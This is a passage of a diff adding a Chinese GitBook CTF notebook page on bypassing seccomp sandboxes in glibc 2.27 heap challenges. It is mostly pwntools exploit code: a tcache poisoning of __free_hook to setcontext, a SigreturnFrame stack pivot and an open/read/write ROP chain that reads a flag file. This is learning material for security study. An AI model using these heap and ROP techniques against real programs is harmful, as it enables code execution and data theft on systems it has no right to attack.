+    ret += p64(prdx_ret)+p64(arg3)
+    ret += p64(function)
+    <span class="hljs-keyword">return</span> ret
+read_addr = libcbase + libc.sym[<span class="hljs-string">&apos;read&apos;</span>]
+open_addr = libcbase + libc.sym[<span class="hljs-string">&apos;open&apos;</span>]
+write_addr = libcbase + libc.sym[<span class="hljs-string">&apos;write&apos;</span>]
+flag_string_addr = (free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>)+<span class="hljs-number">0x200</span>
+payload = ropchain(read_addr,<span class="hljs-number">0</span>,flag_string_addr,<span class="hljs-number">0x10</span>)
+payload += ropchain(open_addr,flag_string_addr,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
+payload += ropchain(read_addr,<span class="hljs-number">3</span>,flag_string_addr,<span class="hljs-number">0x30</span>)
+payload += ropchain(write_addr,<span class="hljs-number">1</span>,flag_string_addr,<span class="hljs-number">0x30</span>)
+p.send(payload)
+pause()
+p.send(<span class="hljs-string">&apos;./flag&apos;</span>)
+p.interactive()
+</code></pre>
+<p>&#x65B9;&#x6CD5;&#x4E09;&#xFF08;&#x9700;&#x8981;&#x6CC4;&#x9732;&#x5806;&#x5730;&#x5740;&#xFF09;</p>
+<p>rop&#xFF08;rop&#x5730;&#x5740;&#x5728;heap&#x4E0A;&#xFF09;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+context.log_level = <span class="hljs-string">&apos;debug&apos;</span>
+p = process(<span class="hljs-string">&apos;./test&apos;</span>)
+libc = ELF(<span class="hljs-string">&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span>)
+elf = ELF(<span class="hljs-string">&apos;./test&apos;</span>)
+context.arch = elf.arch
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pr</span><span class="hljs-params">(a,addr)</span>:</span>
+    log.success(a+<span class="hljs-string">&apos;====&gt;&apos;</span>+hex(addr))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(length)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;len:&apos;</span>,str(length))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,ct)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;3&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+    p.send(ct)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;4&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;idx:&apos;</span>,str(idx))
+add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#0</span>
+add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>
+delete(<span class="hljs-number">0</span>)
+show(<span class="hljs-number">0</span>)
+
+leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&apos;\x00&apos;</span>*<span class="hljs-number">2</span>)
+p.sendlineafter(<span class="hljs-string">&apos;:&apos;</span>,<span class="hljs-string">&apos;5&apos;</span>)
+p.recvuntil(<span class="hljs-string">&apos;heap_base:&apos;</span>)
+heapbase = int(p.recvuntil(<span class="hljs-string">&apos;\n&apos;</span>)[:<span class="hljs-number">-1</span>],<span class="hljs-number">16</span>)<span class="hljs-number">-0x260</span>
+libcbase = leak - (<span class="hljs-number">0x7f3490493ca0</span><span class="hljs-number">-0x7f34900a8000</span>)
+setcontext_door = libcbase + libc.sym[<span class="hljs-string">&apos;setcontext&apos;</span>]+<span class="hljs-number">53</span>
+free_hook = libcbase + libc.sym[<span class="hljs-string">&apos;__free_hook&apos;</span>]
+syscall = libcbase +<span class="hljs-number">0xd2745</span>
+pr(<span class="hljs-string">&apos;libcbase&apos;</span>,libcbase)
+pr(<span class="hljs-string">&apos;heapbase&apos;</span>,heapbase)
+
+
+delete(<span class="hljs-number">1</span>)
+edit(<span class="hljs-number">1</span>,p64(free_hook))
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span>
+add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span>
+edit(<span class="hljs-number">3</span>,p64(setcontext_door))
+<span class="hljs-comment">#=========================setcontext===========================</span>
+prdi_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rdi\nret&quot;</span>)).next()
+prsi_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rsi\nret&quot;</span>)).next()
+prdx_ret = libcbase+libc.search(asm(<span class="hljs-string">&quot;pop rdx\nret&quot;</span>)).next()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ropchain</span><span class="hljs-params">(function,arg1,arg2,arg3)</span>:</span>
+    ret  = p64(prdi_ret)+p64(arg1)
+    ret += p64(prsi_ret)+p64(arg2)
+    ret += p64(prdx_ret)+p64(arg3)
+    ret += p64(function)
+    <span class="hljs-keyword">return</span> ret
+read_addr = libcbase + libc.sym[<span class="hljs-string">&apos;read&apos;</span>]
+open_addr = libcbase + libc.sym[<span class="hljs-string">&apos;open&apos;</span>]
+write_addr = libcbase + libc.sym[<span class="hljs-string">&apos;write&apos;</span>]
+
+
+context_addr = heapbase + <span class="hljs-number">0x260</span>
+flag_string_addr = context_addr + <span class="hljs-number">0x200</span>
+frame = SigreturnFrame()
+frame.rsp = context_addr+<span class="hljs-number">0xf8</span>
+frame.rip = libcbase+libc.search(asm(<span class="hljs-string">&quot;ret&quot;</span>)).next()
+payload = str(frame)
+payload += ropchain(open_addr,flag_string_addr,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
+payload += ropchain(read_addr,<span class="hljs-number">3</span>,flag_string_addr,<span class="hljs-number">0x30</span>)
+payload += ropchain(write_addr,<span class="hljs-number">1</span>,flag_string_addr,<span class="hljs-number">0x30</span>)
+payload = payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&apos;\x00&apos;</span>)+<span class="hljs-string">&apos;./flag\x00&apos;</span>
+
+add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#4</span>
+edit(<span class="hljs-number">4</span>,payload)
+<span class="hljs-comment">#gdb.attach(p,&apos;b *&apos;+str(setcontext_door))</span>
+
+delete(<span class="hljs-number">4</span>)
+
+p.interactive()
+</code></pre>
+<p>&#x53C2;&#x8003;&#x6587;&#x7AE0;</p>
+<p><a href="https://blog.csdn.net/carol2358/article/details/108351308?spm=1001.2014.3001.5506" target="_blank">https://blog.csdn.net/carol2358/article/details/108351308?spm=1001.2014.3001.5506</a></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../" class="navigation navigation-prev " aria-label="Previous page: 沙箱">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html" class="navigation navigation-next " aria-label="Next page: glibc2.29下堆题绕过沙箱">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"glibc2.27下堆题绕过沙箱","level":"1.3.1","depth":2,"next":{"title":"glibc2.29下堆题绕过沙箱","level":"1.3.2","depth":2,"path":"沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.md","ref":"沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.md","articles":[]},"previous":{"title":"沙箱","level":"1.3","depth":1,"path":"沙箱/README.md","ref":"沙箱/README.md","articles":[{"title":"glibc2.27下堆题绕过沙箱","level":"1.3.1","depth":2,"path":"沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.md","ref":"沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.md","articles":[]},{"title":"glibc2.29下堆题绕过沙箱","level":"1.3.2","depth":2,"path":"沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.md","ref":"沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.md","articles":[]},{"title":"glibc2.31下堆题绕过沙箱","level":"1.3.3","depth":2,"path":"沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.md","ref":"沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.md","articles":[]},{"title":"seccomp&ptcl","level":"1.3.4","depth":2,"path":"沙箱/seccomp&ptcl/seccomp&ptcl.md","ref":"沙箱/seccomp&ptcl/seccomp&ptcl.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["-sharing","sharing-plus","-search","search-pro","code","expandable-chapters","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","qq","linkedin","qzone","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"TTY","lang":"zh-cn","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Gitbook电子书","gitbook":"*","description":"Gitbook电子书示例项目"},"file":{"path":"沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.md","mtime":"2021-03-27T12:57:34.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-12-03T08:37:12.473Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
